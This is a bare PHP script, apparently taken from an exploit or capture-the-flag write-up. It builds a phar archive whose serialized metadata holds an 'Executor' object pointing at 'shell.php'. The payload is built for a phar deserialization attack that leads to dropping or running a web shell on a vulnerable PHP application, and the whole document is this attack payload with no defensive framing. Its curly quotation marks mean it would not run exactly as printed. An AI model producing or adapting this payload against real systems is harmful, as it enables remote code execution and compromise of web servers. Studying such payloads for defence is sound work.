<?php
$phar = new Phar(‘test.phar’);
$phar->startBuffering();
$phar->setStub(‘<?php __HALT_COMPILER(); ? >’); // Somehow required by PHP

class Executor{
private $filename=’shell.php’;
private $signature='[MD5 for the shell.php]’;
}
$object = new Executor();
$phar->setMetadata($object);
$phar->addFromString(‘test.txt’, ‘text’); // Somehow required by PHP
$phar->stopBuffering();

?>